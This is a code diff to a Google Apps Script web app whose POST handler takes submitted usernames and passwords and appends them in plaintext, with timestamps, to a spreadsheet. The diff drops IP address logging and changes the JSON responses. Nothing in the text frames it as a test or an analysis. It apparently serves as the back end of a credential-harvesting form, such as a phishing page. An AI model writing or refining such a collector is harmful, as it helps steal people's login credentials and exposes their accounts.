@@ -1,6 +1,8 @@
 // Google Apps Script to handle form submissions
 function doGet(e) {
-  return ContentService.createTextOutput("Service is running");
+  return ContentService.createTextOutput(JSON.stringify({
+    status: "Service is running"
+  })).setMimeType(ContentService.MimeType.JSON);
 }
 
 function doPost(e) {
@@ -12,8 +14,7 @@ function doPost(e) {
     // Get form data from e.parameter
     const data = {
       username: e.parameter.username,
-      password: e.parameter.password,
-      ipAddress: e.parameter.ipAddress
+      password: e.parameter.password
     };
     
     // Get current timestamp
@@ -23,8 +24,7 @@ function doPost(e) {
     sheet.appendRow([
       timestamp,
       data.username,
-      data.password,
-      data.ipAddress || 'N/A'
+      data.password
     ]);
     
     // Return success response
@@ -40,7 +40,7 @@ function doPost(e) {
     // Return error response
     return ContentService.createTextOutput(JSON.stringify({
       success: false,
-      message: 'Error recording data: ' + error.toString()
+      error: 'Error recording data: ' + error.toString()
     })).setMimeType(ContentService.MimeType.JSON);
   }
 } 
